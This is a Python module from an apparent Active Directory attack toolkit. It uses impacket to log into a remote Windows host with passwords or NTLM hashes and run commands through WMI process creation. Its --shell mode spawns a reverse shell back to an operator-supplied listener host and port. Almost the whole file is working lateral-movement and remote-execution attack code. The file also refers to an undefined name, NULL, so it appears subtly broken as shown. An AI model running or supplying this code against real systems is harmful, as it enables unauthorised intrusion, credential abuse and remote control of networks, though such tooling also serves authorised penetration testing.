"""WMI remote execution via impacket.

Supports --shell for interactive reverse shell via WMI process creation.
"""


import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.lateral.wmi_exec.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["remote_command_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1047"],
}


def _wmi_execute(args: Any, cred: ADCredential, command: str) -> None:
    """Execute a command via WMI Win32_Process.Create."""
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.dcom.wmi import (
        CLSID_WbemLevel1Login, IID_IWbemLevel1Login, IWbemLevel1Login,
    )

    dcom = DCOMConnection(
        args.target, cred.username, cred.password or "",
        args.domain, cred.lm_hash, cred.nt_hash,
    )
    iInterface = dcom.CoCreateInstanceEx(
        CLSID_WbemLevel1Login, IID_IWbemLevel1Login,
    )
    iWbemLevel1Login = IWbemLevel1Login(iInterface)
    iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
    iWbemLevel1Login.RemRelease()

    win32_process, _ = iWbemServices.GetObject("Win32_Process")
    win32_process.Create(command, "C:\\", None)
    dcom.disconnect()


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    if not cred.has_password and not cred.has_hash:
        print("[!] WMI-exec requires credentials", file=sys.stderr)
        return 1

    shell_mode = getattr(args, "shell", False)
    print("[*] WMI-exec → {} ({}\\{}){}".format(
        args.target, args.domain, cred.username,
        " [interactive shell]" if shell_mode else ""))

    try:
        from impacket.dcerpc.v5.dcomrt import DCOMConnection
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    if shell_mode:
        lhost = getattr(args, "lhost", None)
        lport = int(getattr(args, "lport", 4444))
        shell_type = getattr(args, "shell_type", "wmi_process_shell")

        if not lhost:
            print("[!] --shell requires --lhost", file=sys.stderr)
            return 1

        from adxpl.core.shell_mixin import spawn_ad_shell

        def _exec_payload(payload: str) -> None:
            _wmi_execute(args, cred, payload)

        ok = spawn_ad_shell(
            target=args.target, lhost=lhost, lport=lport,
            shell_type=shell_type, execute_fn=_exec_payload,
        )
        return 0 if ok else 1

    try:
        _wmi_execute(args, cred, "cmd.exe /c whoami > C:\\Windows\\Temp\\axf_out.txt")
        print(f"[+] WMI connection established to {args.target}")
        print("[+] Command executed via WMI")
        return 0
    except Exception as exc:
        print(f"[-] WMI-exec failed: {exc}", file=sys.stderr)
        return 1
